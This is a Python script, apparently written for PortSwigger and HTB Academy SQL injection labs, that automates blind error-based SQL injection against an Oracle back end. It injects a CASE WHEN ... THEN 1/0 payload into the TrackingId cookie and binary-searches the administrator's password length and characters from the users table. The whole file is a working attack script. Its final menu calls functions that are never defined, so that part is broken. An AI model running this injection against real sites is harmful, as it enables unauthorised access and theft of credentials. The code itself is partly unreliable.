import sys,requests,json
from urllib.parse import quote_plus

def url():
    return sys.argv[1]

def TrackingId_value():
    session = requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

def oracle(q):
    #payload = quote_plus(f"({q})")
    cookies = {"TrackingId": f"{TrackingId_value()}' AND (SELECT CASE WHEN ({q}) THEN (1/0) ELSE NULL END FROM dual)=1--"}
    response = requests.get(f"{url()}",cookies=cookies)
    return response.status_code == 500

# Calculat the Length
def dump_length(q):
    low = 0
    high = 100
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"(SELECT LENGTH({q}) FROM users WHERE username = 'administrator') BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    return low

# Dumping String
def dump_string(q, length):
    var=""
    for i in range(1, length+1):
        low = 32
        high = 127
        while low <= high:
            mid = (low+high) // 2
            if oracle(f"ASCII(SUBSTR(({q}),{i},1)) BETWEEN {low} AND {mid}"):
                high = mid - 1
            else:
                low = mid + 1
        print(chr(low),end='')
        sys.stdout.flush()
        var += chr(low)
    return var

# PortSwigger 
#length=dump_length("password")
#print(length)
#print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))

func = int(input("""HTB_ACADEMY_ORACLE
(1) Get Length
(2) Get Name
Your Option : """))

if func == 0:
    test()
elif func == 1:
    payload = input("Payload : ")
    print(dumpNumber(payload))
elif func == 2:
    payload = input("Payload : ")
    string,length=payload.rsplit(maxsplit=1)
    print(dumpString(string,int(length)))
